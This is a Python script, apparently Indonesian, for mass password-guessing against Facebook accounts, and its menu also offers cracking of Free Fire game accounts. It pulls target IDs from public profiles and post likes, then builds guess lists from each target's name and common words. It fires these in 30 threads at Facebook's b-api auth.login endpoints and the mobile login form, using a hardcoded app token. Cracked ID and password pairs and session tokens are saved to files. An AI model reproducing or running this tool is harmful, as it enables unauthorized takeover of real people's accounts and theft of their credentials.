...
def tokenz():
	...
	try:
		...
		os.system('clear')
		logo()
		print('πππππππππππππππππππππππππππππππππππππππππππππππππ')
		token = input(' [?] token : ')
		try:
...
def bot():
	...
	wulan_cntk = ('Suport Mbokey yook 😘')
	citra_chan = ('Bang luh ga vakum🤣,canda')
...
def menu():		
    ...
    logo()
    print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
    print(' %s[%s+%s] %sAuhtor Script : %sDANZZ X NANO'%(O,H,O,N,K))
    print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
 ...
 #   print(" %s[%s+%s] %sTgl. Lahir  : %s"%(O,H,O,N,ttl))
    ...
    mbo = input(" %sApakah Anda Ingin memilih Menu lain %s[y-t] ? :%s "%(O,N,H))
    if mbo == "":
    	menu()
    elif mbo == "t":
    	gasu()
    	...
    	jalan(" \n%spilih yang benar Kontol Jangan seenak nya !"%(K))
    	menu()
def yak():
    print(" %s[%s2%s]. %sCrack Masaal [%s10%s]"%(O,H,O,N,H,N))
    keyy = input(" %sApakah Anda Ingin memilih Menu lain %s[y-t] ? :%s "%(O,N,H))
    if keyy == "":
    	menu()
    elif keyy == "y":
    	konsel()
...
def konsel():
    ...
    nak = input(" %sApakah Anda Ingin memilih Menu lain %s[y-t] ? :%s "%(O,N,H))
    if nak == "":
    	menu()
    elif nak == "y":
    	nak_jing()
...
def nak_jing():
    ...
    jalan(" %sketik 'oke' untuk menampilkan semua menu"%(K))
    suhu_ = input(" %sApakah Anda Ingin memilih Menu lain %s[y-t] ? :%s "%(O,N,H))
    if suhu_ == "":
    	menu()
    elif suhu_ == "y":
    	welco_()
...
def welco_():
    ...
    print(" %s[%s9%s]. %scrack dari like postingan"%(O,H,O,N))
    _gg_ = input(" %sApakah Anda Ingin memilih Menu lain %s[y-t] ? :%s "%(O,N,H))
    if _gg_ == "":
    	menu()
    elif _gg_ == "y":
    	pemula()
    	...
    	gasu()
def pemula():
    print(" %s[%s10%s]. %sCrack akun Game [ff]"%(O,H,O,N))
...
def gasu():
    ...
    if asw == "":
    	...
    	os.system('rm -f token.txt')
    	print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
    	jalan(" %s[%s✓%s] %sberhasil menghapus token "%(O,H,O,N))
    	exit()
    else:
...
def garena():
	os.system('clear')
	logo()
	jalan('\n%sSelamat Datang Di Script Crack Free fire Semoga Hari Anda Suram'%(H));time.sleep(0.03)
	jalan('Gunakan Sebijak Nya %sMbokey %sTidak bertanggu Jawab ! \n'%(K,H));time.sleep(0.03)
	jalan('\nJangan Lupa Ikutin Saya %sMbokey Bhizer X Reall'%(K));time.sleep(0.03)
	#jalan("\033[1;93m"*48)
	#jalan('\n%sWellcome To :%s %s '%(N,H,mbokey));time.sleep(0.03)
	jalan('\n%sSystem Clear Dengan Cepat Mohon tunggu !'%(K));time.sleep(0.03)
	jalan("\033[1;93m"*48)
	free = input('enter');fire()
def fire():
 	os.system('clear')
 	logo()
 #	os.system('clear')
 	print('\n[1] Crack Free Fire Dari Id Publik')
 	print('[2] Crack Free Fire Id Publik Massal')
 	print('[3] Crack Dari Like Free fire')
 	print('[4] Log out Game Free fire')
 	aang = input('[?] Silakan Anda Pilih : ')
def gantiua():
	print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
	...
	if ajg in[""]:
		...
		try:
			...
			zedd.close()
			print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
			print(" %s[%s✓%s] %sberhasil mengganti ua"%(O,H,O,H))
...
def post():
		...
		r = requests.get("https://graph.facebook.com/%s/likes?limit=9999999&access_token=%s"%(uid, token))
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			nama = i['name']
...
def massal():
	try:
		...
		login()
	try:
		nada = int(input(" %sMau Crack Berapa ID :%s "%(N,H)))
		if nada>10:
	...
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = input("%s Masukkan ID Target Ke %s :%s "%(N,dot,H))
		try:
		...
		#try:
			...
			time.sleep(0.5)
			exit()
	print(" %sJumlah Total ID :%s %s"%(N,K,len(id)))
	atursandi()

#perecode nih senggol dong
def infos():
	print("%sAUHTOR SCRIPT CRACK FACEBOOK"%(K))
	print('%sππππππππππππππππππππ'%(O))
...
def cekhasil():
	...
	if anjg == '':
		...
		try:
			print('%sπππππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
...
def otomatis():
	munculopsi()
	print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
	print(" %s[%s1%s]. %smetode API v1.0 [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode API v2.0 [%sfast little%s]"%(O,H,O,N,O,N))
	print(" %s[%s3%s]. %smetode API v3.0 [%sfast vs slow%s]"%(O,H,O,N,O,N))
	print(" %s[%s4%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s5%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s6%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print(' %s[%s+%s] %s recommended %sMetode %sB-api %sFast'%(O,K,O,K,N,O,N))
	print('%sπππππππππππππππππππππππππππππππππππππππππππππππππ'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		...
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				...
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "anjing"]
				#elif len(name) == 3 or len(name) == 4 or len(name) == 5:
					#pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456"]
				else:
#100053375841465 100020835339311 100008033621225 100024379170390					
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "anjing"]
		...
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				...
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456", "sayang", "kontol", "anjing"]
				#elif len(name) == 3 or len(name) == 4 or len(name) == 5:
					#pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456"]
				else:
#100053375841465 100020835339311 100008033621225 100024379170390					
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(apii, uid, pwx)
			pass
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		...
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				...
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"1", nam[0]+"12", nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456", "sayang", "kontol", "anjing"]
				#elif len(name) == 3 or len(name) == 4 or len(name) == 5:
					#pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456"]
				else:
#100053375841465 100020835339311 100008033621225 100024379170390					
					pwx = [name, nam[0]+"1", nam[0]+"12", nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(apiii, uid, pwx)
			pass
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
...
def apiii(uid, pwx):
	...
	#for wk in list('>\<\>>\<<\>>>\<<<\>>>>\<<<<\>>>\<<<\>>\<<\>\<'):
	for wk in list('/\/'):
		#clear = random.choice(['Loading', 'sabar', 'tunggu', 'crack', 'hasil', 'anjay', 'keren'])
	#clear = random.choice(['Loading', 'sabar', 'tunggu', 'crack', 'hasil', 'anjay', 'keren'])
		sys.stdout.write(
		"\r %s[%s%s%s] [ %sBom %s] %s/%s OK:-%s - CP:-%s "%(N,K,wk,N,H,N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		#berakit rakit ke hulu)
		#berenang renang ketepihan)
		#jadi pemula dahulu )
		#pulang pulang jadi suhu  :) )
		#codingan BY Mbokey Bhizer X Reall)
		#b-api New b-api User Manual code Meta)
		headers_ = {'user-agent': ua,'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
		suhu_mbokey = 'https://b-api.facebook.com/v3.0/method/auth.login'
		send = ses.get(suhu_mbokey + '?format=json&email=' +str(uid)+ '&password=' +str(pw)+ '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
		if "c_user" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "session_key" in send.text and "EAAG" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "access_token" in send.text and "EAAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
...
def apii(uid, pwx):
	...
	for pw in pwx:
		...
		#b-api New b-api User Manual code Meta)
		headers_ = {'user-agent': ua,'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
		suhu_mbokey = 'https://b-api.facebook.com/v2.0/method/auth.login'
		send = ses.get(suhu_mbokey + '?format=json&email=' +str(uid)+ '&password=' +str(pw)+ '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
		if "c_user" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
...
def api(uid, pwx):
	...
	for pw in pwx:
		...
		#b-api New b-api User Manual code Meta)
		headers_ = {'user-agent': ua,'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
		suhu_mbokey = 'https://b-api.facebook.com/v1.0/method/auth.login'
		send = ses.get(suhu_mbokey + '?format=json&email=' +str(uid)+ '&password=' +str(pw)+ '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
		if "c_user" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
...
def crack(uid, pwx, host, **kwargs):
	...
	try:
		for pw in pwx:
			...
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",data=kwargs)
